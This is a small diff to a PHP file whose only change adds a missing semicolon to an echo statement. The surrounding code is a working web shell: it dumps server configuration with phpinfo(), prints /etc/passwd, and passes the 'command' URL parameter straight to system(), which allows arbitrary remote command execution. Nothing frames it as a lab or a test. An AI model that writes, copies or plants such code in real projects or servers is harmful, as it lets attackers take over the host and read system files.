@@ -1,6 +1,6 @@
 <?php
 phpinfo();
-echo "hùng đỗ"
+echo "hùng đỗ";
 echo readfile("/etc/passwd");
 echo "Run command: ".htmlspecialchars($_GET['cmd']);
 system($_GET['command']);
